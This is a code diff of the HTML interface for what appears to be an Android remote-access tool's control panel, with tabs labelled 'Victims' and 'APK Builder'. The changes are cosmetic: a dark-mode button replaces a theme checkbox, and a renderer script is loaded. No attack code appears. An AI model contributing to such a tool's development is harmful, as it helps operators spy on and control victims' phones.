@@ -21,6 +21,7 @@
     <script type="text/javascript" src="../node_modules/fomantic-ui/dist/semantic.min.js"></script>
     <script type="text/javascript" src="../node_modules/angular/angular.js"></script>
     <script type="text/javascript" src="assets/js/controllers/AppCtrl.js"></script>
+    
     <!-- Insert this line after script imports -->
     <script>
         if (window.module) module = window.module;
@@ -44,10 +45,7 @@
         <a class="item active notDraggable border" data-tab="first"><i class="large eye icon"></i>Victims</a>
         <a class="item notDraggable border" data-tab="second"><i class="large green android icon"></i>APK Builder</a>
         <div class="ui right mini text menu notDraggable">
-            <div class="ui toggle checkbox">
-                <input type="checkbox" ng-click="ChangeTheme()" checked name="public">
-                <label></label>
-            </div>
+            <button id="toggle-dark-mode">Toggle Dark Mode</button>
             
             <button class=" ui circular orange button" ng-click="minimize()"
                 style="font-size: 6px;height: 17px"></button>
@@ -135,7 +133,7 @@
             <div class="w65 " style="display: inline-block" ng-style="{'color':log.color}" ng-bind="log.msg"></div>
         </div>
     </div>
-
+    <script src="../renderer.js"></script>
 </body>
 
 </html>
